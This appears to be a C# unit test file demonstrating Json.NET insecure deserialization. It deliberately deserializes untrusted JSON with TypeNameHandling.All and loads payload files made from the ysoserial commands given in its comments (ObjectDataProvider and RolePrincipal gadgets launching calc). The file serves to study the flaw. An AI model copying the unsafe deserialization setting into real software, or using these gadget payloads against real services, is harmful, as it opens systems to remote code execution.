using Microsoft.VisualStudio.TestTools.UnitTesting;
using Newtonsoft.Json;
using Newtonsoft.Json.Serialization;
using System;
using System.IO;
using System.Reflection;
using Todo.Models;

namespace JsonVulnerabilties.Test
{
    [TestClass]
    public class JsonVunerabilities
    {
        public TestContext TestContext { get; set; }

        [TestMethod]
        public void SerializeFido()
        {
            Dog fido = new Dog
            {
                Name = "Fido",
                Breed = "Golden Retriever",
                Owner = "John Doe"
            };

            string dogString = SerializeJsonObject(fido);

            TestContext.WriteLine(dogString);

            Dog fidoRehyrdated = DeserializeJsonObject<Dog>(dogString);
        }

        [TestMethod]
        public void LaunchObjectDataProviderExploit()
        {
            // ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
            string jsonObjectDataProviderPayload = File.ReadAllText("ObjectDataProviderExploit.json");

            TestContext.WriteLine(jsonObjectDataProviderPayload);

            try
            {
                object roleObjectDataProviderExploited = DeserializeJsonObject<object>(jsonObjectDataProviderPayload);

                Assert.IsNotNull(roleObjectDataProviderExploited);
            }
            // The exploit does not trigger an exception
            catch (Exception ex)
            {
                TestContext.WriteLine(ex.ToString());
            }
        }

        [TestMethod]
        public void LaunchRolePrincipalExploit()
        {
            // ysoserial.exe -f Json.Net -g RolePrincipal -o raw -c "calc"
            string jsonRolePrincipalPayload = File.ReadAllText("RolePrincipalExploit.json");

            TestContext.WriteLine(jsonRolePrincipalPayload);

            try
            {

                object rolePrinicpalExploited = DeserializeJsonObject<object>(jsonRolePrincipalPayload);
            }
            catch (TargetInvocationException ex)
            {
                TestContext.WriteLine(ex.ToString());
            }
        }

        private static string SerializeJsonObject<T>(T obj)
        {

            return JsonConvert.SerializeObject(obj, Formatting.Indented, new JsonSerializerSettings
            {
                ContractResolver = new CamelCasePropertyNamesContractResolver(),
                TypeNameHandling = TypeNameHandling.All
            });
        }

        private static T DeserializeJsonObject<T>(string json)
        {
            return JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.All
            });
        }
    }
}
